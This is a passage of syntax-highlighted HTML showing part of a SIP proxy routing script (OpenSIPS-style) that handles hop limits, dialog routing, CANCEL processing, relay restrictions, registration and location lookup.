&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;route&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;!mf_process_maxfwd_header&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;10&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		send_reply&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;483&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Too Many Hops&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;has_totag&lt;span style=&#34;color:#f92672&#34;&gt;())&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;# handle hop-by-hop ACK (no routing required)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt; is_method&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ACK&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; t_check_trans&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			t_relay&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;# sequential request within a dialog should&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;# take the path determined by record-routing&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt; !loose_route&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#75715e&#34;&gt;# we do record-routing for all our traffic, so we should not&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#75715e&#34;&gt;# receive any sequential requests without Route hdr.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			send_reply&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;404&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Not here&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;is_method&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;BYE&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#75715e&#34;&gt;# do accounting even if the transaction fails&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			do_accounting&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;log&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;failed&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;# route it out to whatever destination was set by loose_route()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;# in $du (destination URI).&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		route&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;relay&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# CANCEL processing&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;is_method&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;CANCEL&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;t_check_trans&lt;span style=&#34;color:#f92672&#34;&gt;())&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			t_relay&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# absorb retransmissions, but do not create transaction&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	t_check_trans&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt; !&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;is_method&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;REGISTER&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;is_myself&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$fd&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;					
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#75715e&#34;&gt;# if caller is not local, then called number must be local&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;!is_myself&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$rd&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				send_reply&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;403&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Relay Forbidden&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# preloaded route checking&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;loose_route&lt;span style=&#34;color:#f92672&#34;&gt;())&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		xlog&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;L_ERR&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Attempt to route with preloaded Route&amp;#39;s [&lt;/span&gt;$fu&lt;span style=&#34;color:#e6db74&#34;&gt;/&lt;/span&gt;$tu&lt;span style=&#34;color:#e6db74&#34;&gt;/&lt;/span&gt;$ru&lt;span style=&#34;color:#e6db74&#34;&gt;/&lt;/span&gt;$ci&lt;span style=&#34;color:#e6db74&#34;&gt;]&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;!is_method&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ACK&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			send_reply&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;403&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Preload Route denied&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# record routing&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;!is_method&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;REGISTER|MESSAGE&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		record_route&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# account only INVITEs&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;is_method&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;INVITE&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		do_accounting&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;log&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;!is_myself&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$rd&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		append_hf&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;P-hint: outbound\r\n&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		route&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;relay&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# requests for my domain&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;is_method&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;PUBLISH|SUBSCRIBE&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		send_reply&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;503&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Service Unavailable&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;is_method&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;REGISTER&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;!save&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;location&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			sl_reply_error&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;$rU&lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt;NULL&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;# request with no Username in RURI&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		send_reply&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;484&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Address Incomplete&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# do lookup with method filtering&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;!lookup&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;location&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;m&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		t_reply&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;404&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Not Found&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
